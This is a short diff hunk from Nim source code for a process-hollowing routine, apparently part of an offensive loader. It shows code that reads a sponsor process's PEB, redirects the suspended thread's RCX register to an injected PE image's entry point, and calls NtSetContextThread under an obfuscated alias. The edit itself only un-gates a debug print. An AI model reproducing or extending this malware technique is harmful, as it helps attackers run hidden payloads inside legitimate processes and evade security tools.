@@ -106,7 +106,7 @@ proc hollow2*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         when not defined(release): echo "[-] Could not read from sponsor process PEB"
         quit()
     var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
-    when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
+    echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
     context.Rcx = cast[DWORD64](entryPoint)
     if IGyhziwCULdezDSq( # NtSetContextThread
         sponsorThreadHandle, addr context
